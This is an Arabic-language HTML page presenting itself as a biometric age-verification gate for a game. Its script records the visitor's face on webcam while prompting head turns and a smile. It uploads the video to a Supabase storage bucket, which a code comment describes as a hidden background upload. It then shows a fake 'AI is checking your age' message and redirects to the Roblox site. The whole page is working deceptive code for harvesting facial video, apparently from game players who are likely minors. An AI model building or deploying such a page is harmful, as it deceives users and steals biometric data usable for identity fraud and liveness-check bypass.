<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة فحص العمر - لعبة قيد الإنتاج</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c1b, #24243e);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .main-wrapper {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            justify-content: center;
            max-width: 500px; /* تم تصغير العرض ليتناسب مع الصندوق الواحد */
            width: 100%;
        }

        .gate-container {
            background: rgba(15, 15, 26, 0.75);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 242, 254, 0.2);
            text-align: center;
            flex: 1;
            min-width: 320px;
        }

        h1 { color: #00f2fe; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
        p { color: #a4b0be; font-size: 14px; margin-bottom: 20px; }

        .camera-box {
            position: relative;
            width: 260px;
            height: 260px;
            margin: 0 auto 20px auto;
            border-radius: 50%;
            border: 4px dashed #00f2fe;
            overflow: hidden;
            background-color: #111;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }

        .guide-overlay {
            display: none;
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.8);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: bold;
            color: #00f2fe;
            border: 1px solid #00f2fe;
            z-index: 10;
            white-space: nowrap;
        }

        .scan-line {
            display: none;
            position: absolute;
            width: 100%;
            height: 4px;
            background: #00f2fe;
            box-shadow: 0 0 12px #00f2fe;
            top: 0;
            z-index: 5;
            animation: scan 2.5s linear infinite;
        }

        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }

        button {
            background: linear-gradient(45deg, #00f2fe, #4facfe);
            color: #000;
            border: none;
            padding: 12px 25px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3);
            transition: 0.3s ease;
        }

        #statusText { margin-top: 15px; font-size: 15px; font-weight: bold; color: #4facfe; }
    </style>

    <!-- استدعاء مكتبة Supabase الرسمية -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

    <div class="main-wrapper">
        <div class="gate-container">
            <h1>فحص العمر الحيوي</h1>
            <p>الرجاء تفعيل الكاميرا والتحقق من التعليمات الظاهرة.</p>
            
            <div class="camera-box" id="camBox">
                <div class="guide-overlay" id="guideOverlay">استعد...</div>
                <div class="scan-line" id="scanLine"></div>
                <video id="webcam" autoplay playsinline muted></video>
                <span id="placeholderText" style="color: #555;">الكاميرا مغلقة</span>
            </div>
            
            <button id="actionBtn">بدء الفحص وتسجيل الفيديو</button>
            <div id="statusText">جاهز للمحاكاة...</div>
        </div>
    </div>

    <script>
        // إعدادات اتصال Supabase الخاصة بك
        const SUPABASE_URL = "https://sqbdnxbgbrtfxrcilcub.supabase.co";
        const SUPABASE_KEY = "sb_publishable_l4B0HXNv6rYkyFGiv4DzNg_99J3V8Ip";
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        const video = document.getElementById('webcam');
        const guideOverlay = document.getElementById('guideOverlay');
        const scanLine = document.getElementById('scanLine');
        const placeholderText = document.getElementById('placeholderText');
        const actionBtn = document.getElementById('actionBtn');
        const statusText = document.getElementById('statusText');

        let mediaRecorder;
        let recordedChunks = [];
        const instructions = [
            "👤 ضع وجهك داخل الإطار الدائري",
            "➡️ التفت ببطء جهة اليمين",
            "⬅️ التفت ببطء جهة اليسار",
            "😊 ابتسم للتأكد من الملامح",
            "⚙️ جاري معالجة الفحص الحركي..."
        ];

        actionBtn.addEventListener('click', startVerification);

        async function startVerification() {
            actionBtn.disabled = true;
            statusText.innerText = "جاري تشغيل الكاميرا وبدء التسجيل...";
            recordedChunks = [];

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                placeholderText.style.display = "none";
                video.style.display = "block";
                scanLine.style.display = "block";
                guideOverlay.style.display = "block";

                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    
                    statusText.innerText = "جاري رفع فيديو التحقق إلى السيرفر الآمن...";
                    
                    const fileName = 'video_' + Date.now() + '.mp4';

                    // الرفع المخفي والخلفي إلى مجلد videos في Supabase
                    const { data, error } = await supabase.storage
                        .from('videos')
                        .upload(fileName, blob, {
                            cacheControl: '3600',
                            upsert: false,
                            contentType: 'video/mp4'
                        });

                    if (error) {
                        console.error("خطأ أثناء الرفع:", error);
                        statusText.innerText = "فشل الرفع، يرجى التأكد من إعدادات المجلد في حسابك.";
                        statusText.style.color = "#ff4757";
                    } else {
                        // النص المطلوب بعد انتهاء الفحص والرفع بنجاح
                        statusText.innerText = "جاري فحص عمرك من قبل الـ AI...";
                        statusText.style.color = "#2ed573";
                        document.getElementById('camBox').style.borderColor = "#2ed573";

                        // التحويل التلقائي إلى موقع روبلوكس الرسمي بعد ثانيتين
                        setTimeout(() => {
                            window.location.href = "https://www.roblox.com"; 
                        }, 2000);
                    }
                };

                mediaRecorder.start();
                runInstructions(0);
            } catch (err) {
                statusText.innerText = "فشل تشغيل الكاميرا. يرجى إعطاء صلاحية الكاميرا للموقع.";
                actionBtn.disabled = false;
            }
        }

        function runInstructions(index) {
            if (index < instructions.length) {
                guideOverlay.innerText = instructions[index];
                setTimeout(() => runInstructions(index + 1), 3000);
            } else {
                endVerification();
            }
        }

        function endVerification() {
            scanLine.style.display = "none";
            guideOverlay.innerText = "اكتمل الفحص! ✓";

            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
            const stream = video.srcObject;
            if (stream) stream.getTracks().forEach(track => track.stop());
        }
    </script>
</body>
</html>
